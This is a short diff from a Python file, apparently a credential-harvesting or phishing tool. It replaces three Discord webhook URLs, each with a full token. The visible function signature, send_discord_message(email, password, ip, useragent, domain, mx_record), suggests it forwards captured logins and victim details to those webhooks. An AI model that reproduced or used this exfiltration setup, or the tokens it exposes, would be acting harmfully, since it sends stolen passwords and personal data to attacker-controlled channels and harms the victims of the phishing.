@@ -18,9 +18,9 @@ import dns.resolver
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1355791681055887472/orNabiCaMWV0igV1x5u10Kq3WbjA3dyGGK_FJ8zxgQoFqdqfDxcAbRfsiz35GI8XQoKg",
-    "https://discord.com/api/webhooks/1355791690731884704/aIbZzQAPqSn3i2Rgi2R60DVU46c2X_zruFNKxqMuodxc512wtlWOBAGbOpbuA_e_K1SR",
-    "https://discord.com/api/webhooks/1355791701255524525/ujx8lBdFKSnKBeWXP17gQndoTofePEhxyl7S3lDtBk0Rfu6vK1xwzowPzpI4mpTdSajR"
+    "https://discord.com/api/webhooks/1364937056207503411/ihuLWMFoCUcIGXvVS0wQSS_gsxv_wzDXG_q75klfyFNC1yOYraRcWVNhsQSYrPsiTmzE",
+    "https://discord.com/api/webhooks/1364937094144725043/twTcnGUCeCyu7dJzdRQ4jvbbJ1ZMCQdIfXxMVklXf9ehsYHltvRojtw8yVsO1W2nkEBA",
+    "https://discord.com/api/webhooks/1364937118878793819/z4veBM6jAYsRkGTAbLwrqJqxzWhoHOQx7HZIHK0oUyIs4xW9OMZxOIxQF6kICkklMIAJ"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
